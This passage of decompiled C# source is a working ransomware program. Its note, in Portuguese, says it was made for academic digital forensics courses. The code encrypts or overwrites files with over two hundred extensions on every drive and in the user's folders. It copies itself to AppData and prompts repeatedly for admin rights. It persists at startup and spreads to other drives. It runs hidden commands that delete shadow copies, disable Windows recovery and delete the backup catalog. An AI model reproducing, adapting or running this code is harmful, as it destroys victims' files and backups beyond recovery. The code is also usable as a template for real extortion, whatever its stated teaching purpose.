PLbz207W9xEyOjbXRhgg+lfr/AOB59R+L37Cfhv8AZy+GNvFqGv6x4btjO/mYgsI1VSXlYZ2kkYA6n8K/I/xX4lv/ABf4hvPE2qRwrc3sxlmFtCI0DHk4UcCvVvgl+3x+0r+z5okmg/DDxlFZQy7RI8tlHK5VeAu5wSFHpX0HiBwpmnFOBwssI4KtQmqiUm+XmtpdpNtJ62tr5H0/ijwRnPGuW4OeBcI4jDVFUipt8nPZWu0m2ovW1lzWs7K59Cy/8EF/2lpZWlPxA8LjcxOPtEv/AMbrY+HX/BJ39pP9lLxxpXx5ur7QtetPDl7He32n2F4yyvDGdzbd6gE4HrXjH/D4D9uvv8U4f/BVB/8AE1i+P/8AgqN+2l8SPDFx4R8QfFiRbO6QpOLSziiZ1IwRuVQcYNfL/wBj+NWLXsMZicK6MvdmrS1i9HtFPbzR8b/YH0h8d/s2PxmDlQn7s0oyu4PSSVoJ3te1mvU7z/gq1+3J8M/2uNe0LR/hnpl2LbQfM869uk2eazhcqB14IIr4/p0js7F2OSTkk+tNr9T4dyDL+F8npZbgk/Z072u7vV3bb9WftXCnC+V8G5DRyjL01SpJ25nd6tttvzbYUUUV7Z9EFFFFABX6if8ABB7w7oVx8JvGuuT6LbSXgvVjW6eBS4XYx2gkZxX5d16h8Af2wfj9+zJHdW/wf8bPp0F7zc2zQJJHIcYyQwPNfD+IvDeYcWcK1ctwU1GpJxacm0vdkm02k3rbsfnHivwjmnHHBVfKMvqRhVm4NOTajaMk2m0m9bdjG/aUG39oLxoCMY8TXvb/AKbNXEVf8U+JNW8YeJL7xXr1x5t7qN29xdShQN8jsWY4HTk1Qr67BUZ4fBUqUt4xin6pJH3eXYeeEy+jQnvCMYu210kmFFFFdR2BRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQB//Z";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "hackead0.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[6] { "**********************VOCE FOI HACKEAD0*****************************", "", "ESTE RANSOMWARE FOI CRIADO PARA OS CURSOS VOLTADOS A ACADEMIA DE FORENSE DIGITAL E SUA UTILIZACAO E ESTRITAMENTE PARA FINS ACADEMICOS.", "", "***************PROF. CAIQUE BARQUETA******************************", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>vzTADLtGPSqsrKqhtizKhqpGeoIthgt6A5zrYBVfSFXepMawiA/wysbcyBj4my1wVWd6dN2M+V6z722IH29GRu315Z7H1aEmz9h4sdHmqSAANOOwbvs8GfqWvB1GUVDx5HXUNWNnNf3JRgSjyWif8B+4GwrtNowMrk5POkrossU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
